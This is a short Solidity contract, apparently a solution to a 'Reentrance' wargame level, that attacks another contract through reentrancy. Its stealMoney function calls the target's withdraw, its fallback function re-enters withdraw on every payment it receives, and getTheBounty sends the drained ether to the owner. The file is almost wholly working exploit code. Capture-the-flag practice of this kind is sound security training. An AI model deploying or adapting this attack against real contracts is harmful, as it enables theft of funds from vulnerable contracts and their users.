pragma solidity ^0.5.1;

import "./Reentrance.sol";

contract ReentranceSol {
    Reentrance private reentrance;
    uint256 public amount;
    address payable owner;

    constructor(address payable _reentranceAddress, uint256 _amount)
        public
        payable
    {
        reentrance = Reentrance(_reentranceAddress);
        amount = _amount;
        owner = msg.sender;
    }

    function stealMoney() public {
        reentrance.withdraw(amount);
    }

    function getTheBounty() public {
        owner.call.value(address(this).balance)("");
    }

    function() external payable {
        reentrance.withdraw(amount);
    }
}
